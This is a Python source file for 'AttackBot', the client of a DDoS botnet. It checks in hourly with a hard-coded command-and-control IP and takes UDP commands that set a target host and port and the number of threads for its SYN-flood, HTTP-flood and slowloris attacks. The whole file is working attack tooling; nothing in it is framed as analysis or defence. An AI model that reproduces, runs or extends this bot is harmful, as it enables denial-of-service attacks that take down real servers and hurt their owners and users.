# -*- coding: utf-8 -*-
"""
Created on Fri Jun  8 09:38:27 2018

@author: DrLC
"""

from httpflood import sendGET
from slowloris import sendSlow
from synflood import sendSYN

import time
import socket
import sys
import threading

TGT_IP_DEFAULT = '47.94.138.231'
TGT_PORT_DEFAULT = 80
PORT_DEFAULT = 2337
SYNFLOOD_THREAD_DEFAULT = 0
SLOWLORIS_THREAD_DEFAULT = 0
HTTPFLOOD_THREAD_DEFAULT = 0
MANAGE_PORT = 2341
MANAGE_IP = '47.94.138.231'
botname = 'BOT'


port = None
n_httpflood = None
n_slowloris = None
n_synflood = None
tgt_ip = None
tgt_port = None

def print_help():
    print()
    print("+--------------------------+")
    print("|                          |")
    print("|      AttackBot           |")
    print("|                          |")
    print("|       by TakingOffPKU    |")
    print("|                          |")
    print("+--------------------------+")
    print()
    print("One attacker in the botnet, which is controlled by the real attacker.")
    print()
    print("Use the following command to start the bot.")
    print("  python3 %s" % (sys.argv[0]))
    print("Optional arguments are:")
    print("  -P or --port\tListen port.")
    print("Example:")
    print("  python3 %s -P LISTEN_PORT"
          % (sys.argv[0]))
    print()


def getopt(ARGS):
    if '-h' in ARGS or '--help' in ARGS:
        try:
            assert False
        except:
            print_help()
            exit(0)
    ret = {"port": PORT_DEFAULT}
    for i in range(1, len(ARGS)):
        if i % 2 == 1:
            if ARGS[i] in ['-P', '--port']:
                ret['port'] = int(ARGS[i + 1])
            else:
                try:
                    assert False
                except:
                    print_help()
                    exit(0)
    return ret

class main_threads(threading.Thread):
    
    def run(self):
        print ("Main thread")
        global n_httpflood, n_slowloris, n_synflood, tgt_ip, tgt_port
        while True:
            try:
                #print (str(n_httpflood)+" "+str(n_synflood)+" "+str(n_slowloris))
                if sendGET.THREAD < n_httpflood:
                    #print (sendGET.THREAD)
                    tmp = sendGET(tgt_ip, tgt_port)
                    tmp.start()
                if sendSYN.THREAD < n_synflood:
                    #print (sendSYN.THREAD)
                    tmp = sendSYN(tgt_ip, tgt_port)
                    tmp.start()
                if sendSlow.THREAD < n_slowloris:
                    #print (slowLoris.THREAD)
                    tmp = sendSlow(tgt_ip, tgt_port)
                    tmp.start()
            except:
                exit(0)


class manage_contact_thread(threading.Thread):

    def run(self):
        print ("Manage contact thread")
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((MANAGE_IP,MANAGE_PORT))
                s.send(("142857"+str(botname)+'  ').encode())
                s.recv(1024)
                s.close()
                time.sleep(3600)
                #print (str(n_httpflood)+" "+str(n_synflood)+" "+str(n_slowloris))

            except:
                exit(0)
        
class monitor_thread(threading.Thread):
    
    def run(self):
        print ("Monitor thread")
        global n_httpflood, n_slowloris, n_synflood, tgt_ip, tgt_port, port
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.bind(('0.0.0.0', port))
        while True:  
            data, addr = s.recvfrom(1024)
            data = str(data, encoding='utf-8').strip()
            if data[:2] == 'IP':
                tgt_ip = data[2:].strip()
                print ("Set target IP to "+str(tgt_ip))
            if data[:4] == 'PORT':
                tgt_port = int(data[4:].strip())
                print ("Set target port to "+str(tgt_port))
            if data[:3] == 'SYN':
                n_synflood = int(data[3:].strip())
                print ("Set synflood thread number to "+str(n_synflood))
            if data[:4] == 'HTTP':
                n_httpflood = int(data[4:].strip())
                print ("Set HTTPflood thread number to "+str(n_httpflood))
            if data[:4] == 'SLOW':
                n_slowloris = int(data[4:].strip())
                print ("Set slowloris thread number to "+str(n_slowloris))
            if data[:4] == 'ECHO':
                s.sendto(bytes(data[4:].strip(), encoding="utf-8"), addr)  
            if data == 'STATUS':
                status = str(sendGET.THREAD)+" "+str(sendSYN.THREAD)+\
                    " "+str(sendSlow.THREAD)
                s.sendto(bytes(status, encoding="utf-8"), addr)  
    
if __name__ == "__main__":
    
    args = getopt(sys.argv)
    port = args['port']
    tgt_ip = TGT_IP_DEFAULT
    tgt_port = TGT_PORT_DEFAULT
    n_synflood = SYNFLOOD_THREAD_DEFAULT
    n_httpflood = HTTPFLOOD_THREAD_DEFAULT
    n_slowloris = SLOWLORIS_THREAD_DEFAULT
    monitor = monitor_thread()
    main = main_threads()
    manage_contact = manage_contact_thread()
    t1 = threading.Thread(target=main.run)
    t2 = threading.Thread(target=monitor.run)
    t3 = threading.Thread(target=manage_contact.run)
    t1.setDaemon(True)
    #t2.setDaemon(True)
    t1.start()
    t2.start()
    t3.start()